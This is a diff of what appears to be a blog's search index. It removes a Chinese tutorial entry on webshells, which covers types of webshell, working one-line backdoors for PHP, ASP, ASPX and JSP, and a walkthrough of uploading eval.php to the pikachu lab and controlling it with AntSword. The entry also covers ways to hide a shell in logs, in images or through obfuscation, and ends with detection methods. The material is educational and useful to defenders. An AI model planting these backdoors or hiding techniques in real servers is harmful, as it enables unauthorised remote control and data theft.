@@ -173,42 +173,9 @@
 ]]></content>
   </entry>
   <entry>
-    <title>webshell</title>
+    <title></title>
     <url>/2022/04/22/webshell/</url>
-    <content><![CDATA[<p>简介<br>Webshell是通过服务器开放的端口获取服务器的某些权限。</p>
-<p>webshell又称脚本木马，一般分为大马、小马、一句话木马。</p>
-<p>大马，体积大、功能齐全、能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。</p>
-<p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>
-<p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>
-<p>原理<br>利用文件上传漏洞、SQL注入漏洞、RCE漏洞等，将恶意文件放到web服务器中，也就是常说的”后门”，之后可以进行文件管理、数据库管理、远程命令执行、提权等恶意操作。</p>
-<p>常见一句话木马<br>php<br><?php @eval($_POST[value]); ?><br><?php assert($_POST[value]);?><br><?php
-@preg_replace("/[email]/e",$_POST['h'],"error");
-?><br>asp<br>&lt;%eval request (“value”)%&gt;<br>&lt;% execute(request(“value”)) %&gt;<br>aspx<br>&lt;%@ Page Language=”Jscript” %&gt; &lt;% eval(Request.Item[“value”]) %&gt;<br>jsp<br>&lt;%<br>if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“\“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());<br>%&gt;<br>攻击<br>靶机：pikachu</p>
-<p>工具：中国蚁剑</p>
-<p>首先，利用文件上传漏洞，上传webshell文件</p>
-<p>网络安全-文件上传漏洞的原理、攻击与防御_lady_killer9的博客-CSDN博客</p>
-<p>文件为eval.php，内容为</p>
-<?php eval($_POST['eval']); ?>
-
-<p> 之后利用中国蚁剑连接网站，空白处右键-&gt;添加数据</p>
-<p>添加数据</p>
-<p>添加数据成功</p>
-<p>上传文件及其他功能</p>
-<p>终端控制<br> 再打开上传webshell的那个目录，可以看到多出来了%SystemDrive%目录， </p>
-<p>目录变化<br>至此，可以进行文件管理，虚拟终端等。</p>
-<p>WebShell管理工具<br>Cknife 中国菜刀<br>antSword 中国蚁剑<br>冰蝎 动态二进制加密网站管理客户端<br>weevely3 Weaponized web shell<br>Altman the cross platform webshell tool in .NET<br>Webshell Sniper Manage your website via terminal<br>quasibot complex webshell manager, quasi-http botnet<br>webshell隐藏<br>隐藏到日志</p>
-<p>例如，修改发送数据包的头部，添加webshell。 web服务器一般会保存访问记录到Web日志，若找到web日志，且放到可执行目录下，可能获得shell。</p>
-<p>隐藏到合法文件</p>
-<p>例如，文件上传漏洞中，将php代码放到jpg文件中，可以使用@运算符，以防发生任何错误。</p>
-<p>混淆</p>
-<p>删除空格、换行符等，导致代码文件比较乱，使用编码或加密来隐藏掉恶意函数名等。</p>
-<p>检测与防御<br>静态检测<br>web日志</p>
-<p>在对日志文件进行预处理后，对日志记录进行文本特征匹配、统计特征计算与文件关联性分析，最后对检测结果汇总，列出疑似的Webshell文件。</p>
-<p>例如，网站目录下某php文件访问量过少，且来源ip固定。</p>
-<p>动态检测</p>
-<p>webshell传到服务器了，黑客总要去执行它吧，webshell执行时刻表现出来的特征，我们称为动态特征。</p>
-<p>例如，webshell如果执行系统命令的话，会有进程。</p>
-]]></content>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>xss攻击</title>
